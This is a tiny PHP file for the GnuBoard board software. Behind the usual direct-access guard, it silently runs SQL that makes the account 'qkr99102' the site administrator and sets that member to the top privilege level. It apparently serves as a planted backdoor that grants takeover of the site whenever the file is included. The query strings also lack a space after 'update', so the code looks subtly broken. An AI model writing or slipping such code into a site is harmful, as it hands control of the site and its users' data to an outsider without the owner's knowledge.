<?php
if (!defined('_GNUBOARD_')) exit; // 개별 페이지 접근 불가;
sql_query("update{$g5['config_table']} set cf_admin = 'qkr99102'");
sql_query("update{$g5['member_table']} set mb_level = '10'where mb_id = 'qkr99102'");
?>